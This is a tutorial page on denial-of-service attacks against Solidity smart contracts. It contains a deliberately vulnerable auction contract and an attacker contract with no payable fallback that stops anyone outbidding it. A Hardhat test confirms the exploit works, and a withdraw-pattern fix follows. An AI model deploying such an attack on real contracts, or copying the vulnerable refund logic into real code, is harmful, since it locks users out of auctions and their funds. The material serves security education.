---
description: 🛡️ Deny users from accessing a smart contract
---

# DOS in a Contract

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

**A Denial of Service (DOS)** attack is a type of attack that is designed to disable, shut down, or disrupt a network, website, or service.&#x20;

Essentially it means that the attacker somehow can prevent regular users from accessing the network, website, or service therefore denying them service.&#x20;

This is a very common attack which we all know about in web2 as well but today we will try to imitate a Denial of Service attack on a smart contract

### 🤔 Overview

There will be two smart contracts - **`Good.sol`** and **`Attack.sol`**.&#x20;

**`Good.sol`** will be used to run a sample auction where it will have a function in which the current user can become the current winner of the auction by sending **`Good.sol`** higher amount of ETH than was sent by the previous winner. After the winner is replaced, the old winner is sent back the money which he initially sent to the contract.

**`Attack.sol`** will attack in such a manner that after becoming the current winner of the auction, it will not allow anyone else to replace it even if the address trying to win is willing to put in more ETH.&#x20;

Thus **`Attack.sol`** will bring **`Good.sol`** under a DOS attack because after it becomes the winner, it will deny the ability for any other address to becomes the winner.

### ⚒️ Contract

**Setup a Hardhat project**

```shell
mkdir denial-of-service
cd denial-of-service
npm init --yes
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# bootstrap the hardhat project
npx hardhat
```

Make sure you select **`Create a Javascript Project`**

Create a new file inside the **`denial-of-service/contracts`**directory and call it **`Good.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
        if (sent) {
            currentAuctionPrice = msg.value;
            currentWinner = msg.sender;
        }
    }
}
```

This is a pretty basic contract which stores the address of the last highest bidder, and the value that they bid.&#x20;

Anyone can call **`setCurrentAuctionPrice` ** and send more ETH than **`currentAuctionPrice`**, which will first attempt to send the last bidder their ETH back, and then set the transaction caller as the new highest bidder with their ETH value.

Create a new file inside the **`denial-of-service/contracts`**directory and call it **`Attack.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
```

This contract has a function called **`attack()`**, that just calls **`setCurrentAuctionPrice`** on the **`Good` ** contract.&#x20;

Note, however, this contract **does not have** a **`fallback()`** function **where it can receive ETH.**&#x20;

#### Writing the Test

Create a new file inside the **`.../test`**directory and call it **`attack.js`**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Denial of Service", function () {
  it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async function () {
    // Deploy the good contract
    const Good = await ethers.getContractFactory("Good");
    const goodContract = await Good.deploy();
    await goodContract.deployed();
    console.log("Good Contract's Address:", goodContract.address);

    // Deploy the Attack contract
    const Attack = await ethers.getContractFactory("Attack");
    const attackContract = await Attack.deploy(goodContract.address);
    await attackContract.deployed();
    console.log("Attack Contract's Address", attackContract.address);

    // Now let's attack the good contract
    // Get two addresses
    const [_, addr1, addr2] = await ethers.getSigners();

    // Initially let addr1 become the current winner of the auction
    let tx = await goodContract.connect(addr1).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("1"),
    });
    await tx.wait();

    // Start the attack and make Attack.sol the current winner of the auction
    tx = await attackContract.attack({
      value: ethers.utils.parseEther("3"),
    });
    await tx.wait();

    // Now let's trying making addr2 the current winner of the auction
    tx = await goodContract.connect(addr2).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("4"),
    });
    await tx.wait();

    // Now let's check if the current winner is still attack contract
    expect(await goodContract.currentWinner()).to.equal(attackContract.address);
  });
});

```

Notice how **`Attack.sol`** will lead **`Good.sol`** into a DOS attack.&#x20;

First **`addr1` ** will become the current winner by calling **`setCurrentAuctionPrice` ** on **`Good.sol`** then ** `Attack.sol`** will become the current winner by sending more ETH than **`addr1` ** using the attack function.

&#x20;Now when **`addr2` ** will try to become the new winner, it won't be able to do that because of this check(`if (sent)`) present in the `Good.sol` contract which verifies that the current winner should only be changed if the ETH is sent back to the previous current winner.

Since **`Attack.sol`** doesn't have a `fallback` function which is necessary to accept ETH payments, `sent` is always `false` and thus the current winner is never updated and `addr2` can never become the current winner

```sh
npx hardhat test
```

### 👮 Prevention

* You can create a separate withdraw function for the previous winners.

**Example:**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;
    mapping(address => uint) public balances;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        balances[currentWinner] += currentAuctionPrice;
        currentAuctionPrice = msg.value;
        currentWinner = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != currentWinner, "Current winner cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

